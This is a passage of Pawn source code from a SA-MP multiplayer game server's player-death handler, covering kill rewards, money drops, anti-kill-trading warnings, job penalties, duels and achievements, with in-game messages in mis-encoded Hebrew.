			lasttablekiller = killerid;
			playerinfo[killerid][tables]++;
			if(playerinfo[killerid][logged]) fsetint(fuser(killerid),"Tables",playerinfo[killerid][tables]);
		}
		else if(playerinfo[killerid][clan] > 0 && lasttableclan != playerinfo[killerid][clan])
		{
			doneTable = 0;
			for(new i = 0; i < maxrows; i++) if(IsPlayerConnected(deathtable[i][0]) && playerinfo[deathtable[i][0]][clan] > 0 && playerinfo[deathtable[i][0]][clan] == playerinfo[killerid][clan] && deathtable[i][1] != INVALID_PLAYER_ID) doneTable++;
			if(doneTable == maxrows)
			{
				format(string,sizeof(string)," {%s}!%s шсь· фф°щтх· ∙щщы· ьўьря",ClanHexColor(playerinfo[killerid][clan]),claninfo[playerinfo[killerid][clan]][cname]);
				News(string);
				lasttableclan = playerinfo[killerid][clan];
			}
		}
	}
	dbg(6,"2");
	if(playerinfo[playerid][ball] > 0)
	{
		DestroySpecialVehicle(playerinfo[playerid][ballv]);
		playerinfo[playerid][ball] = 0, playerinfo[playerid][ballv] = -1;
	}
	if((GetPlayerCheckpoint(playerid) == cp_bank || GetPlayerCheckpoint(playerid) == cp_ammu) && /*GetPlayerInterior(playerid) > 0 && */!playerinfo[playerid][usedkill])
	{
		SendClientMessage(playerid,green," .юЇЁщ ∙ф°тх рх·ъ ссЁў / счЁх· Ё∙ўщэ, ыёЇъ Ё∙р° рЎьъ");
		if(killerid != INVALID_PLAYER_ID)
		{
			SendClientMessage(killerid,red," .юЄ°ы· ф∙°· цщф·ф ыщ ф°т· счЁх· Ё∙ўщэ / ссЁў хьыя Ёф°т·");
			//SetKick(killerid,INVALID_PLAYER_ID,GetPlayerCheckpoint(playerid) == cp_bank ? ("ф°щтф ссЁў") : ("ф°щтф счЁх· Ё∙ўщэ"));
			SetPlayerHealth(killerid,0.0);
		}
		return 1;
	}
	if(GetPlayerCheckpoint(playerid) == cp_vstore && !playerinfo[playerid][usedkill])
	{
		SendClientMessage(playerid,green," .юЇЁщ ∙ф°тх рх·ъ счЁх· °ысщэ, ыёЇъ Ё∙р° рЎьъ");
		if(killerid != INVALID_PLAYER_ID)
		{
			SendClientMessage(killerid,red," .юЄ°ы· ф∙°· цщф·ф ыщ ф°т· счЁх· °ысщэ хьыя фхЎр· юф∙°·");
			SetKick(killerid,INVALID_PLAYER_ID,"ф°щтф счЁх· °ысщэ");
		}
		return 1;
	}
	playerinfo[playerid][bonus][0] = 0;
	dbg(6,"2.1");
	if(killerid != INVALID_PLAYER_ID)
	{
		new flag = 1;
		if(GetMoney(playerid) > 0)
		{
			if(GetPlayerTeleportArea(playerid) != -1) if(Teleports[GetPlayerTeleportArea(playerid)][Tnoshooting]) flag = 0;
			if(GetPlayerCheckpoint(playerid) == cp_vstore || GetPlayerCheckpoint(playerid) == cp_bank || GetPlayerCheckpoint(playerid) == cp_ammu) flag = 0;
			if(playerinfo[playerid][paytimer][2] > -1)
			{
				SendClientMessage(playerid,grey," (ыёЇъ Ё∙р° рЎьъ ыщ р·ф срюЎЄ ∙ьщч· ыёє)");
				SendClientMessage(killerid,grey," (ьр ·хыь ьўсь р· фыёє ∙ь ю∙·ю∙ цф ыщ фхр сущхў ю∙·ю∙ сЇўхуф ь∙ьщч· ыёє)");
				flag = 0;
			}
			if(flag)
			{
				if(GetPlayerVirtualWorld(playerid) != world_normal || GetPlayerInterior(playerid) != 0 || GetPlayerStatus(playerid) != status_none) GiveMoney(killerid,GetMoney(playerid),3);
				else CreateMoneyPickup(playerinfo[playerid][deathpos][0]+floatrand(-1.0,1.0),playerinfo[playerid][deathpos][1]+floatrand(-1.0,1.0),playerinfo[playerid][deathpos][2],world_normal,GetMoney(playerid));
				if(GetMoney(playerid) >= 1000000) ObjectiveComplete(killerid,objective_killedmill);
				ResetMoney(playerid);
			}
			else SendClientMessage(playerid,grey," (ыёЇъ Ё∙р° рЎьъ ыщ рёх° ьф°хт ыря)");
		}
		dbg(6,"2.2");
		if(reason == 38 && !playerinfo[killerid][inact] && playerinfo[playerid][dmzone] != dmz_mm && playerinfo[playerid][dmzone] != dmz_gungame)
		{
			if(!IsPlayerInAnyVehicle(killerid)) format(string,sizeof(string),"(%s) killed %s ($%d) - %d",GetIP(killerid),GetName(playerid),flag ? GetMoney(playerid) : 0,reason);
			else format(string,sizeof(string),"(%s) killed %s ($%d) in vehicle model: %d - %d",GetIP(killerid),GetName(playerid),flag ? GetMoney(playerid) : 0,GetVehicleModel(GetPlayerVehicleID(killerid)),reason);
			/*
			if(!playerinfo[killerid][admin] && !IsPlayerInAnyVehicle(killerid))
			{
			    format(string,sizeof(string),"%s(%d) Killed %s(%d) with a Minigun -- not in a DM area",GetName(killerid),killerid,GetName(playerid),playerid);
			    AdminInfo(killerid,string);
			}
			*/
			Log("Minigun",killerid,string);
		}
		format(string,sizeof(string),"(%s) killed %s ($%d)%s - %d",GetIP(killerid),GetName(playerid),flag ? GetMoney(playerid) : 0,GetPlayerCheckpoint(playerid) == cp_vstore ? (" (IN VSTORE)") : (""),reason);
		Log("Kills",killerid,string);
		dbg(6,"4");
		new logt[M_S];
		format(logt, M_S, "lost %d (death)", GetMoney(playerid));
		Log("Money", playerid, logt);
		ResetMoney(playerid);
		if(reason < 40) serverDetails[sdWeaponKills][reason]++;
		if((playerinfo[killerid][dmzone] == dmz_mm) && !Options[7][optActive]) playerinfo[killerid][dmzkills]++;
		if((playerinfo[killerid][dmzone] == dmz_mm) && !Options[7][optActive] && playerinfo[killerid][dmzkills] == 5)
		{
			playerinfo[killerid][dmzkills] = 0, playerinfo[killerid][kills]++, playerinfo[killerid][killsforid][playerid]++;
			if(playerinfo[killerid][logged]) fsetint(fuser(killerid),"Kills",playerinfo[killerid][kills]);
			SendClientMessage(killerid,orange," .Єь ыъ ∙ф°т· 5 ∙чўЁщэ срцх° ущ-рэ ўщсь· ф°щтф");
		}
		if(playerinfo[playerid][hitman] > 0)
		{
			GiveMoney(killerid,playerinfo[playerid][hitman],5);
			playerinfo[playerid][hitman] = 0;
		}
		if(IsPlayerInAnyVehicle(playerid)) serverDetails[sdDeaths][4]++;
		if(reason >= 0 && reason <= 39)
		{
			playerinfo[killerid][wkills][reason]++;
			if(playerinfo[killerid][wkills][4] == 5) ObjectiveComplete(killerid,objective_knife);
			if(playerinfo[killerid][wkills][26] == 150) ObjectiveComplete(killerid,objective_sawnpro);
			if(!playerinfo[killerid][wkillschange][reason]) playerinfo[killerid][wkillschange][reason] = true;
		}
		dbg(6,"2.3");
		if(playerinfo[killerid][dmzone] != dmz_mm || Options[7][optActive])
		{
			new bool:dontChange=false, wrns = 0;
			AddKillingEnergy(killerid,playerid,reason);
			if(!IsPlayerInAnyVehicle(killerid) && !IsPlayerUsingDB(playerid) && playerinfo[playerid][dmzone] != dmz_rcwar)
			{
				for(new i=0;i<sizeof(noobw) && !dontChange;i++) if(reason == noobw[i]) dontChange = true;
				if(dontChange && Options[7][optActive])
				{
					playerinfo[killerid][kills]++, playerinfo[killerid][killsforid][playerid]++;
					if(playerinfo[killerid][logged]) fsetint(fuser(killerid),"Kills",playerinfo[killerid][kills]);
				}
				if(!dontChange)
				{
					for(new i = KILL_TESTS-2; i >= 0; i--) playerinfo[killerid][lastkills][i+1] = playerinfo[killerid][lastkills][i];
					playerinfo[killerid][lastkills][0] = playerid;
					for(new i = 0; i < KILL_TESTS; i++)
					{
						if((playerinfo[killerid][lastkills][i] != INVALID_PLAYER_ID && playerinfo[killerid][lastkills][i] == playerid) ||
						(playerinfo[playerid][lastkills][i] != INVALID_PLAYER_ID && playerinfo[playerid][lastkills][i] == killerid)) wrns++;
					}
					if(wrns >= (KILL_TESTS/2)+(KILL_TESTS/3))
					{
						playerinfo[killerid][tricking][0]++, playerinfo[playerid][tricking][0]++;
						if(playerinfo[killerid][tricking][0] == 1 || playerinfo[playerid][tricking][0] == 1)
						{
							new warningdialog[300];
							format(warningdialog,sizeof(warningdialog),@c(darkred) "%s + %s:\n" @c(red) "!Єьщыэ ьфЇёщў ь°юх· р· юЄ°ы· фф°щтх· хф°юх·\nсюўхэ ьф°хт рчу р· ф∙Ёщ, Ёёх ьф°хт ∙чўЁщэ рч°щэ с∙°·\nсющуф х·ю∙щых р·э ЎЇхщщэ ьфЄЁ∙",GetName(killerid),GetName(playerid));
							ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightred) "!рцф°ф",warningdialog,"OK","");
							ShowPlayerDialog(killerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightred) "!рцф°ф",warningdialog,"OK","");
							format(string,sizeof(string),"(+ %s) ўщсьх рцф°ф °р∙хЁф Єь °юрх· юЄ°ы· ф°юх·",GetName(playerid));
						}
						else
						{
							playerinfo[killerid][tricking][1] = 120;
							if(playerinfo[killerid][kills] > 0)
							{
								SendClientMessage(killerid,red," .щ°ух ьъ 2 ф°щтх· Єь ∙°щющ· р· юЄ°ы· фф°щтх· хф°юх·! ью∙ъ ∙·щ уўх· ьр щЄьх фф°щтх· ∙ьъ");
								playerinfo[killerid][kills] = playerinfo[killerid][kills]-2 <= 0 ? 0 : playerinfo[killerid][kills]-2;
							}
							format(string,sizeof(string),"(+ %s) ўщсьх рцф°ф #%d Єь °юрх· юЄ°ы· ф°юх·",GetName(playerid),playerinfo[killerid][tricking][0]);
						}
						AdminInfo(killerid,string);
						return 1;
					}
					else
					{
						playerinfo[killerid][kills]++, playerinfo[killerid][killsforid][playerid]++;
						if(Options[0][optActive]) playerinfo[killerid][kills]++, playerinfo[killerid][killsforid][playerid]++;
						else if(Options[3][optActive]) playerinfo[killerid][kills] += 2, playerinfo[killerid][killsforid][playerid] += 2;
						if(playerinfo[killerid][scroll] == scroll_doublekill && !random(2) && playerinfo[killerid][scrollusing] && CanUseScroll(killerid))
						{
							SendClientMessage(killerid,yellow," !сцых· 50 рчхц ёщыхщщэ ∙фЎьщчх, цыщ· сф°щтф ЁхёЇ·");
							playerinfo[killerid][kills]++, playerinfo[killerid][killsforid][playerid]++;
						}
						//if(playerinfo[killerid][logged]) fsetint(fuser(killerid),"Kills",playerinfo[killerid][kills]);
						if(playerinfo[killerid][level] >= 1 && playerinfo[killerid][level] < sizeof(levels)-1) if(levels[playerinfo[killerid][level]+1][NeedKills]-playerinfo[killerid][kills] <= 0) PlayerLevelUp(killerid);
						if(playerinfo[killerid][kills] != 0 && (playerinfo[killerid][kills]%1000) == 0)
						{
							GiveMoney(killerid,3000,6);
							SendClientMessage(killerid,orange," .Єь ыъ ∙ф°т· 1000 ∙чўЁщэ ўщсь· 3000$");
						}
						else if(playerinfo[killerid][kills] != 0 && (playerinfo[killerid][kills]%500) == 0)
						{
							GiveMoney(killerid,1200,6);
							SendClientMessage(killerid,orange," .Єь ыъ ∙ф°т· 500 ∙чўЁщэ ўщсь· 1200$");
						}
						else if(playerinfo[killerid][kills] != 0 && (playerinfo[killerid][kills]%100) == 0)
						{
							GiveMoney(killerid,300,6);
							SendClientMessage(killerid,orange," .Єь ыъ ∙ф°т· 100 ∙чўЁщэ ўщсь· 300$");
						}
						if(reason == 28 || reason == 26)
						{
							playerinfo[killerid][bonus][1]++;
							if(playerinfo[killerid][bonus][1] == 10)
							{
								GiveMoney(killerid,80,7);
								SendClientMessage(killerid,orange," .ўщсь· 80$ MicroUzi/Sawnoff Єь ыъ ∙ф°т· 10 ∙чўЁщэ Єэ фЁ∙ўщэ");
								playerinfo[killerid][bonus][1] = 0;
							}
						}
						if(reason == 35)
						{
							playerinfo[killerid][bonus][2]++;
							if(playerinfo[killerid][bonus][2] == 20)
							{
								GiveMoney(killerid,100,7);
								SendClientMessage(killerid,orange," .ўщсь· 100$ RocketLauncher Єь ыъ ∙ф°т· 20 ∙чўЁщэ Єэ фЁ∙ў");
								playerinfo[killerid][bonus][2] = 0;
							}
						}
					}
					playerinfo[killerid][bonus][0]++;
					if(!playerinfo[playerid][inact])
					{
						if(levels[playerinfo[killerid][level]][DeathHealth] > 0.0)
						{
							new Float:h[2];
							GetPlayerHealth(killerid,h[0]);
							h[1] = levels[playerinfo[killerid][level]][DeathHealth]+h[0];
							SetPlayerHealth(killerid,h[1] > 100.0? 100.0:h[1]);
						}
						if(levels[playerinfo[killerid][level]][DeathArmour] > 0.0)
						{
							new Float:a[2];
							GetPlayerArmour(killerid,a[0]);
							a[1] = levels[playerinfo[killerid][level]][DeathArmour]+a[0];
							SetPlayerArmour(killerid,a[1] > 100.0? 100.0:a[1]);
						}
						if(playerinfo[playerid][level] > playerinfo[killerid][level])
						{
							SetPlayerHealth(killerid,100.0);
							if(!playerinfo[killerid][noticedmsg][6])
							{
								SendClientMessage(killerid,grey," (!ы∙р·ф фх°т ∙чўя с°юф тсхфф ююъ фчщщэ ∙ьъ ю·юьрщэ)");
								playerinfo[killerid][noticedmsg][6] = 1;
							}
						}
					}
					if(playerinfo[killerid][bonus][0] > 1)
					{
						/*GiveMoney(killerid,10*playerinfo[killerid][bonus][0], 7);
						format(string,sizeof(string)," .Єь ыъ ∙ф°т· %d ∙чўЁщэ с°Ўє ўщсь· %d$",playerinfo[killerid][bonus][0],playerinfo[killerid][bonus][0]*10);
						SendClientMessage(killerid,orange,string);*/
						if(playerinfo[killerid][bonus][0] % 10 == 0)
						{
							format(string,sizeof(string)," !ф°т с°Ўє " @c(lightpurple) "%d" @c(purple) " ∙чўЁщэ %s",playerinfo[killerid][bonus][0],GetName(killerid));
							News(string);
						}
						if(playerinfo[killerid][bonus][0] > playerinfo[killerid][bonus_si] && playerinfo[killerid][logged])
						{
							playerinfo[killerid][bonus_si] = playerinfo[killerid][bonus][0];
							fsetint(fuser(killerid),"Bonus_S",playerinfo[killerid][bonus_si]);
							format(string,sizeof(string)," !∙с°· р· ∙щр фсхЁхё ∙ьъ - %d",playerinfo[killerid][bonus_si]);
							SendClientMessage(killerid,orange,string);
						}
					}
					playerinfo[killerid][fastkilling][0] = 5;
					if(playerinfo[killerid][fastkilling][0] > 0) playerinfo[killerid][fastkilling][1]++;
					if(playerinfo[killerid][fastkilling][1] > 1)
					{
						new text[64];
						switch(playerinfo[killerid][fastkilling][1])
						{
							case 2: text = "~r~~h~Double Kill!";
							case 3: text = "~g~~h~Triple Kill!";
							case 4: text = "~p~~h~Quadra Kill!";
							case 5: text = "~b~~h~Penta Kill!";
							default: text = "~y~~h~Extra Kill!";
						}
						if(playerinfo[killerid][fastkilling][1] >= 2 && playerinfo[killerid][fastkilling][1] <= 4)
						{
							format(string,sizeof(string),audio_url "%d.wav",playerinfo[killerid][fastkilling][1]);
							PlayAudioStreamForPlayer(killerid,string);
						}
						GameTextForPlayer(killerid,text,2500,6);
					}
				}
				serverDetails[sdDeaths][dontChange ? 1 : 2]++;
			}
		}
		dbg(6,"2.4");
		if(playerinfo[killerid][dmzone] != dmz_none)
		{
			if(DMZs[playerinfo[killerid][dmzone]][dmzUsingLevels])
			{
				if(playerinfo[killerid][dmzlevel] < DMZs[playerinfo[killerid][dmzone]][dmzMaxLevel])
				{
					playerinfo[killerid][dmzlevel]++;
					if(playerinfo[killerid][dmzlevel] == DMZs[playerinfo[killerid][dmzone]][dmzMaxLevel]) format(string,sizeof(string)," + !цхфщ ф°юф фтсхфф сщх·° !%s Єьщ· ь°юф " @c(green) "%d" @c(darkgreen) " срцх° фущ-рэ",DMZs[playerinfo[killerid][dmzone]][dmzName],playerinfo[killerid][dmzlevel]);
					else format(string,sizeof(string)," + !%s Єьщ· ь°юф " @c(green) "%d" @c(darkgreen) " срцх° фущ-рэ",DMZs[playerinfo[killerid][dmzone]][dmzName],playerinfo[killerid][dmzlevel]);
					SendClientMessage(killerid,darkgreen,string);
					GivePlayerDMZLevelWeapons(killerid);
					format(string,sizeof(string),"%s level: %d",DMZs[playerinfo[killerid][dmzone]][dmzName],playerinfo[killerid][dmzlevel]);
					SetPlayerChatBubble(killerid,string,darkgreen,25.0,1500);
				}
				if(playerinfo[playerid][dmzone] == playerinfo[killerid][dmzone] && playerinfo[playerid][dmzlevel] > 1)
				{
					playerinfo[playerid][dmzlevel]--;
					format(string,sizeof(string)," - !%s щ°у· ь°юф " @c(green) "%d" @c(darkgreen) " срцх° фущ-рэ",DMZs[playerinfo[killerid][dmzone]][dmzName],playerinfo[playerid][dmzlevel]);
					SendClientMessage(playerid,darkgreen,string);
					format(string,sizeof(string),"%s Level: %d",DMZs[playerinfo[playerid][dmzone]][dmzName],playerinfo[playerid][dmzlevel]);
					SetPlayerChatBubble(playerid,string,darkgreen,25.0,1500);
				}
				if(playerinfo[killerid][dmzone] == dmz_shavuot)
				{
					GiveMoney(killerid,10,7);
					playerinfo[playerid][shavuot] = 0;
				}
			}
			else
			{
				SetPlayerHealth(killerid,DMZs[playerinfo[killerid][dmzone]][dmzHStatus][0]);
				SetPlayerArmour(killerid,DMZs[playerinfo[killerid][dmzone]][dmzHStatus][1]);
			}
		}
		dbg(6,"3");
		playerinfo[killerid][wlevel]++;
		if(playerinfo[killerid][wlevel] % 10 == 0 && playerinfo[killerid][wantedlevel] <= 6) SetWantedLevel(killerid,playerinfo[killerid][wantedlevel]+1);
		dbg(6,"4");
		if(playerinfo[playerid][work] != work_none && playerinfo[playerid][dmzone] == dmz_none && playerinfo[playerid][tdmzone] == tdmz_none && GetPlayerVirtualWorld(playerid) == world_normal)
		{
			switch(playerinfo[playerid][work])
			{
				case work_cop:
				{
					SendClientMessage(killerid,red," !ф°т· ∙хш°, щщ°ух ьъ 15$");
					GiveMoney(killerid,0-15,8);
				}
				case work_doctor:
				{
					SendClientMessage(killerid,red," !ф°т· °хЇр, щщ°ух ьъ 50$");
					GiveMoney(killerid,0-50, 8);
				}
				case work_taxi:
				{
					SendClientMessage(killerid,red," !ф°т· Ёфт юхЁщ·, щщ°ух ьъ 20$");
					GiveMoney(killerid,0-20, 8);
				}
				case work_bus:
				{
					SendClientMessage(killerid,red," !ф°т· Ёфт рхшхсхё, щщ°ух ьъ 30$");
					GiveMoney(killerid,0-30, 8);
				}
				case work_train:
				{
					SendClientMessage(killerid,red," !ф°т· Ёфт °ыс·, щщ°ух ьъ 100$");
					GiveMoney(killerid,0-100, 8);
				}
				case work_pilot:
				{
					SendClientMessage(killerid,red," !ф°т· шщщё, щщ°ух ьъ 100$");
					GiveMoney(killerid,0-100, 8);
				}
				case work_weapons:
				{
					SendClientMessage(killerid,green," .Єц°· ью∙ш°ф с·Їщё· юхы° Ё∙ўщэ, Єь ыъ ўщсь· 5$");
					GiveMoney(playerid,5, 8);
				}
				case work_killer:
				{
					SendClientMessage(killerid,green," .Єц°· ью∙ш°ф с·Їщё· °хЎч, Єь ыъ ўщсь· 10$");
					GiveMoney(playerid,10, 8);
				}
				case work_icecream:
				{
					SendClientMessage(killerid,red," !ф°т· юхы° тьщуф, щщ°ух ьъ 25$");
					GiveMoney(killerid,0-25, 8);
				}
				case work_drugs:
				{
					SendClientMessage(killerid,green," .Єц°· ью∙ш°ф с·Їщё· ёхч° ёющэ, Єь ыъ ўщсь· 10$");
					GiveMoney(playerid,10, 8);
				}
			}
		}
		if(playerinfo[killerid][work] != work_none && playerinfo[killerid][dmzone] == dmz_none && playerinfo[killerid][tdmzone] == tdmz_none && GetPlayerVirtualWorld(killerid) == world_normal)
		{
			switch(playerinfo[killerid][work])
			{
				case work_cop:
				{
					switch(playerinfo[playerid][work])
					{
						case work_killer, work_weapons, work_drugs:
						{
							GiveMoney(killerid,10, 8);
							playerinfo[killerid][coplevel]++;
							format(string,sizeof(string)," !Єьщ· ь°ю· ∙хш° %d",playerinfo[killerid][coplevel]);
							SendClientMessage(killerid,blue,string);
						}
						default: GiveMoney(killerid,!GetPlayerWantedLevel(playerid) ? -5 : -10, 8);
					}
				}
				case work_doctor, work_taxi, work_bus, work_train, work_pilot, work_icecream: ExitWork(killerid," фх°т ∙чўЁщэ");
				case work_killer:
				{
					switch(playerinfo[playerid][work])
					{
						case work_cop:
						{
							GiveMoney(killerid,20, 8);
							playerinfo[killerid][killerlevel] += 2;
						}
						default:
						{
							GiveMoney(killerid,10, 8);
							playerinfo[killerid][killerlevel]++;
						}
					}
					format(string,sizeof(string)," !Єьщ· ь°ю· °хЎч %d",playerinfo[killerid][killerlevel]);
					SendClientMessage(killerid,blue,string);
				}
			}
		}
		dbg(6,"5");
		if(playerinfo[killerid][pet][3]) StopPetAttacking(killerid);
		if(playerinfo[killerid][ach][0] >= 0)
		{
			new bool:ok = false, checkTo = 0;
			for(new i = 0; i < 3; i++) if(Achievements[playerinfo[killerid][ach][0]][achWeapon] != -1) checkTo = i;
			if(!checkTo) ok = true;
			else for(new i = 0; i <= checkTo && !ok; i++) if(GetPlayerWeapon(killerid) == Achievements[playerinfo[killerid][ach][0]][achWeapon][i]) ok = true;
			if(ok)
			{
				ok = false, checkTo = 0;
				for(new i = 0; i < 3; i++) if(Achievements[playerinfo[killerid][ach][0]][achState] != -1) checkTo = i;
				if(!checkTo) ok = true;
				else for(new i = 0; i <= checkTo && !ok; i++) if(GetPlayerState(killerid) == Achievements[playerinfo[killerid][ach][0]][achState][i]) ok = true;
				if(ok)
				{
					playerinfo[killerid][ach][1]++;
					format(string,sizeof(string)," [Achievement Progress: %02d / %02d]",playerinfo[killerid][ach][1],Achievements[playerinfo[killerid][ach][0]][achKills]);
					SendClientMessage(killerid,lightred,string);
					if(playerinfo[killerid][ach][1] >= Achievements[playerinfo[killerid][ach][0]][achKills])
					{
						format(string,sizeof(string)," ╗ /Ach Start ?ёщщэ сфЎьчф р· фр·т° \"%s\"! °хЎщэ ьЁёх· %s",Achievements[playerinfo[killerid][ach][0]][achName],GetName(killerid));
						SendClientMessageToAll(green,string);
						format(string,sizeof(string),"Achievement-%d",playerinfo[killerid][ach][0]);
						if(!Reward_Check(playerid,string))
						{
							Reward_Give(playerid,string);
							format(string,sizeof(string)," .ыь фысху! цыщ· с-%d$",Achievements[playerinfo[killerid][ach][0]][achPrize]);
							SendClientMessage(killerid,orange,string);
							GiveMoney(killerid,Achievements[playerinfo[killerid][ach][0]][achPrize], 9);
						}
						EndAchievement(killerid,1);
					}
				}
			}
		}
		if(playerinfo[killerid][headshooter])
		{
			playerinfo[killerid][headshooter] = 0;
			if(playerinfo[killerid][lasths] == playerid) playerinfo[killerid][lasths] = INVALID_PLAYER_ID;
		}
		if(headserver == playerid) StartHeadServer(2,killerid);
	}
	else
	{
		new Float:p[2];
		GetPlayerPos(playerid,p[0],p[0],p[1]);
		if(p[1] <= 0.5) serverDetails[sdDeaths][3]++;
	}
	if(playerinfo[playerid][dmzone] == dmz_none) playerinfo[playerid][deaths]++;
	for(new i=0;i<11;i++) playerinfo[playerid][death][i] = 0;
	if(playerinfo[playerid][wantedlevel] > 0) SetWantedLevel(playerid,0);
	if(playerinfo[playerid][inbattle])
	{
	    if(killerid == INVALID_PLAYER_ID) killerid = playerinfo[playerid][binvited];
		SendClientMessage(playerid,green," /again :Ёф°т·, р·ф фюЇёщу сў°с! ьў°с чхц°");
		format(string,sizeof(string)," /again :Ёф°т, р·ф фюЁЎч сў°с! ьў°с чхц° %s",GetName(playerid));
		SendClientMessage(killerid,green,string);
		playerinfo[playerid][lastaga] = 1, playerinfo[killerid][lastaga] = 1;
		switch(playerinfo[playerinfo[playerid][binvited]][bstyle][0])
		{
			case 0: format(string,sizeof(string)," Х /duelinfo :ьЇ°шщ фў°с !%s сў°с Єэ фЁ∙ў %s ЁщЎч р· %s",Ammunation[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][aName],GetName(playerinfo[playerinfo[playerid][binvited]][binvited]),GetName(playerinfo[playerid][binvited]));
			case 1: format(string,sizeof(string)," Х /duelinfo :ьЇ°шщ фў°с !%s сў°с юёхт %s ЁщЎч р· %s",BattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][bsName],GetName(playerinfo[playerinfo[playerid][binvited]][binvited]),GetName(playerinfo[playerid][binvited]));
			case 2: format(string,sizeof(string)," Х /duelinfo :ьЇ°шщ фў°с !%s сў°с °ысщэ юёхт %s ЁщЎч р· %s",VBattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][vbsName],GetName(playerinfo[playerinfo[playerid][binvited]][binvited]),GetName(playerinfo[playerid][binvited]));
		}
		SendClientMessageToAll(orange,string);
		new Float:h, Float:a;
		if(IsPlayerInAnyVehicle(playerinfo[playerid][binvited]))
		{
			GetVehicleHealth(GetPlayerVehicleID(playerinfo[playerid][binvited]),a);
			a = floatdiv(a,10.0);
		}
		else
		{
			GetPlayerHealth(playerinfo[playerid][binvited],h);
			GetPlayerArmour(playerinfo[playerid][binvited],a);
		}
		battleDialog = "", battleDialogDelay = 180;
		if(playerinfo[playerinfo[playerid][binvited]][bstyle][0] == 2)
		{
			format(battleDialog,sizeof(battleDialog),@c(green) "%s :юЁЎч",GetName(playerinfo[playerid][binvited]));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(red) "%s :юЇёщу",battleDialog,GetName(playerid));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(white) "%s" @c(grey) " :%s",battleDialog,VBattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][vbsName],!playerinfo[playerinfo[playerid][binvited]][bstyle][0] ? ("Ё∙ў") : ("ёхт"));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ю∙ъ цюя фў°с: " @c(white) "%02d уўх·" @c(grey) "," @c(white) " %02d ∙Ёщх·",battleDialog,playerinfo[playerid][btime]/60,playerinfo[playerid][btime]%60);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "юЎс фюЁЎч: " @c(white) "%.0f %% чщщэ ь°ыс",battleDialog,a);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ущ°хт фюЁЎч: %s",battleDialog,GetBattleState(playerinfo[playerid][binvited], 2));
		}
		else
		{
			format(battleDialog,sizeof(battleDialog),@c(green) "%s :юЁЎч",GetName(playerinfo[playerid][binvited]));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(red) "%s :юЇёщу",battleDialog,GetName(playerid));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(white) "%s" @c(grey) " :%s",battleDialog,BattleStyles[playerinfo[playerinfo[playerid][binvited]][bstyle][1]][bsName],!playerinfo[playerinfo[playerid][binvited]][bstyle][0] ? ("Ё∙ў") : ("ёхт"));
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ю∙ъ цюя фў°с: " @c(white) "%02d уўх·" @c(grey) "," @c(white) " %02d ∙Ёщх·",battleDialog,playerinfo[playerid][btime]/60,playerinfo[playerid][btime]%60);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "юЎс фюЁЎч: " @c(white) "%.0f %% чщщэ" @c(grey) "," @c(white) " %.0f %% ютя",battleDialog,h,a);
			format(battleDialog,sizeof(battleDialog),"%s\n" @c(grey) "ущ°хт фюЁЎч: %s",battleDialog,GetBattleState(playerinfo[playerid][binvited]));
		}
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(orange) "Ї°шщ фў°с",battleDialog,"ётх°","");
		ShowPlayerDialog(playerinfo[playerid][binvited],dialog_ni,DIALOG_STYLE_MSGBOX,@c(orange) "Ї°шщ фў°с",battleDialog,"ётх°","");
		ResetWeapons(playerinfo[playerid][binvited]);
		SpawnPlayer(playerinfo[playerid][binvited]);
		playerinfo[playerinfo[playerid][binvited]][inbattle] = 0, playerinfo[playerinfo[playerid][binvited]][binvited] = -1, playerinfo[playerinfo[playerid][binvited]][bcd][0] = 0, playerinfo[playerinfo[playerid][binvited]][binviter] = 0;
		playerinfo[playerid][inbattle] = 0, playerinfo[playerid][binvited] = -1, playerinfo[playerid][bcd][0] = 0, playerinfo[playerid][binviter] = 0;
	}
	dbg(6,"6");
	if(GetPlayerTeleportArea(playerid) > -1 && !IsPlayerMAdmin(playerid))
	{
		if(Teleports[GetPlayerTeleportArea(playerid)][Tnoshooting] && killerid != INVALID_PLAYER_ID)
		{
			SetPlayerArmedWeapon(killerid,0);
			SetFreeze(killerid,0);
			PlaySound(killerid,1085);
			playerinfo[killerid][nswarns]++;
			format(string,sizeof(string)," .рщя ьф°хт с∙щтх° цф - рцф°ф %d ю·хъ 5",playerinfo[killerid][nswarns]);
			SendClientMessage(killerid,red,string);
			if(playerinfo[killerid][nswarns] >= 5) return SetKick(killerid,INVALID_PLAYER_ID,"щ°щщф с∙щтх°щэ ∙рёх° ьщ°х· сфэ");
		}
		/*if(IsPlayerInWarTeleport(playerid) && reason <= 46)
		{
			for(new i = 0; i < sizeof(noobw); i++) if(reason == noobw[i])
			{
				SetPlayerArmedWeapon(killerid,playerinfo[killerid][weapons][8] != 0 ? 1 : 0);
				SetFreeze(killerid,0);
				PlaySound(killerid,1085);
				RemovePlayerWeapon(killerid,reason);
				playerinfo[killerid][noobwarns]++;
				format(string,sizeof(string)," .Ёьўч ююъ юрч° хфхр ьр ю·рщэ ьф·ўЇф с∙щтх° фцф! сЁхёє стьь ∙ф°т· цхфщ рцф°ф %d/3 \"%s\" ,фЁ∙ў ∙ьъ",playerinfo[killerid][noobwarns],WeaponName(reason));
				SendClientMessage(killerid,red,string);
				if(playerinfo[killerid][noobwarns] >= 3) return SetKick(killerid,INVALID_PLAYER_ID,"щ°щщф сЁ∙ўщэ с∙щтх°щэ фьр ю·рщющэ");
				break;
			}
		}*/
	}
	dbg(6,"7");
	if(playerinfo[playerid][inact])
	{
		if(playerinfo[playerid][inmanhunt])
		{
			if(manhuntinfo[5] == playerid)
			{
				format(string,sizeof(string),"%s ~n~~w~is the winner in the ~g~~h~~h~%s~w~!",GetName(killerid),ManhuntTypes[manhuntinfo[4]][mhName]);
				MovingText(string,mt_activity,GetPlayerColor(playerid));
